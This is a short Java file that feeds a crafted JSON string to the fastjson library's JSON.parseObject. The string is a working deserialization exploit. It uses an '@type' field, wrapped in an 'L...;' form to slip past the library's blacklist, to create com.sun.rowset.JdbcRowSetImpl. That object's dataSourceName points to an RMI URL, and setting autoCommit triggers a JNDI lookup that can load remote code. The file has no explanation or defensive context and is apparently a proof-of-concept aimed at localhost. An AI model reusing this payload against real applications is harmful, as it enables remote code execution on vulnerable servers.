import com.alibaba.fastjson.JSON;

import java.io.Serializable;

public class Tmp {
    public static void main(String[] args) {
        String fastSer =  "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
        JSON.parseObject(fastSer, Serializable.class);
    }
}
